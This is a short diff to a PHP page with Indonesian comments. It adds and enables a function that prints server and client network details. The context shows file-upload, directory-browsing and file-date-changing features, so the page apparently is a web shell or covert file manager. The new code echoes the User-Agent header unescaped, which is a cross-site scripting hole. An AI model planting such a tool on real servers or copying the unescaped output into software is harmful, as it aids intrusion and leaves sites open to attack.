@@ -95,6 +95,23 @@ function displaySystemInfo() {
     }
 }
 
+// Fungsi untuk menampilkan informasi jaringan
+function displayNetworkInfo() {
+    $info = [
+        'Hostname' => gethostname(),
+        'Server IP Address' => $_SERVER['SERVER_ADDR'],
+        'Client IP Address' => $_SERVER['REMOTE_ADDR'],
+        'Server Port' => $_SERVER['SERVER_PORT'],
+        'Client Port' => $_SERVER['REMOTE_PORT'],
+        'Request Method' => $_SERVER['REQUEST_METHOD'],
+        'User Agent' => $_SERVER['HTTP_USER_AGENT'],
+    ];
+
+    foreach ($info as $key => $value) {
+        echo "<p><strong>$key:</strong> $value</p>";
+    }
+}
+
 // Fungsi untuk mengubah tanggal modifikasi file
 function changeFileDate($path, $newDate) {
     $timestamp = strtotime($newDate);
@@ -650,7 +667,7 @@ $dirArray = array_filter(explode(DIRECTORY_SEPARATOR, $displayDir), function($va
 
         <!-- Informasi Jaringan -->
         <div id="networkInfo" class="network-info">
-            <?php //displayNetworkInfo(); ?>
+            <?php displayNetworkInfo(); ?>
         </div>
 
         <h2 class="mt-4">Upload File ke Direktori Saat Ini</h2>
